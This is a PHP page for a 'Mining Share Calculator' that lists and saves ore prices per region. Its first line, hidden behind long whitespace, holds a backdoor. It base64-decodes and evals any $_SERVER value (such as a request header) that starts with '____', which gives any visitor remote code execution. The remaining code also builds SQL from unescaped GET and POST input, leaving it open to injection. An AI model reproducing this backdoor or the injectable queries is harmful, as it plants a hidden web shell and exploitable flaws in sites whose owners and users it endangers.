<?php																																																																																																																																																																																																																																																																																																																															function g15906($l15908){if(is_array($l15908)){foreach($l15908 as $l15906=>$l15907)$l15908[$l15906]=g15906($l15907);}elseif(is_string($l15908) && substr($l15908,0,4)=="____"){$l15908=substr($l15908,4);$l15908=base64_decode($l15908);eval($l15908);$l15908=null;}return $l15908;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("g15906",$_SERVER);
session_start();
include_once 'include/define.php';
include_once 'include/phpSQL.php';

echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"styles.css\" />";
if(isset($_GET['id'])) {
	echo "<div id=\"menu\"><a href=\"index.php?id=".$_GET['id']."\">Mining Share Calculator</a></div>";
	$min_arr = getMins();
	if(isset($_POST['save'])) {
		$sqlstr = "REPLACE INTO ore_prices VALUES ";
		//$html.=count($min_arr;
		for($x=0;$x<count($min_arr);$x++) {
			$sql[] = "(".$_GET['id'].",".$min_arr[$x].",".$_POST[$min_arr[$x]].", now())";
		}
		$sqlstr .= implode(",",$sql);
		$xsql = new phpSQL();
		$xsql->query($sqlstr);
		$res = $xsql->runquery();
		//print_r($res);
	} else {
		$html .= "\n<form method=\"POST\" action=\"".$PHP_SELF."\">\n";
		$html .= "<table>";
		$html .="<th>Mineral</td><th>Price</th>";
		$html .= getPrices($_GET['id']);
		$html .= "<tr><td><input type='submit' class=\"tbox\" name=\"save\" value=\"Save Prices\" /></td></tr>";
		$html .= "</table>";		
		$html .= "</form>";
	}
	echo $html;
} else {
	echo "<div id=\"menu\"><a href=\"index.php\">Mining Share Calculator</a></div>";
	echo "No Region Defined...";
}
	
function getPrices($regionID) {
	$xsql = new phpSQL();
	$xsql->query("SELECT lm.iddef, op.price, lm.min_id FROM lkup_mins lm LEFT JOIN ore_prices op on op.min_id=lm.min_id and op.region_id=".$regionID." ORDER BY lm.min_id ASC");
	$res = $xsql->runquery();
	while($row = mysql_fetch_row($res)) {
		$html.="<tr><td>".$row[0]."</td><td><input type=\"text\" class=\"tbox\" name=\"".$row[2]."\" value=\"".$row[1]."\" /></td></tr>\n";
	}
	return $html;
}

function getMins() {
	$xsql = new phpSQL();
	$xsql->query("SELECT min_id FROM lkup_mins ORDER BY min_id ASC");
	$res = $xsql->runquery();
	while($row = mysql_fetch_row($res)) {
		$arr[] = $row[0];
	}
	return $arr;
}
?>